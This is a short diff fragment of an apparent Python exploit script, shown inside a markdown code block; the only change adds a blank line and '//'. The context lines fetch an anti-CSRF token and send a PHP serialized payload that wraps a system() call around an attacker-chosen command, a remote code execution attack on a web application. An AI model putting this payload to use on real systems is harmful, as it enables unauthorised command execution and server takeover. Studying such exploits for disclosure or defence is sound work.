@@ -221,3 +221,5 @@ if __name__ == '__main__':
     csrf = get_anticsrf(url=options.url)
     send_payload(url=options.url, payload="s:%s:\"<?php system('%s'); ?>\";" % (20 + len(options.command), options.command))
 ```
+
+//
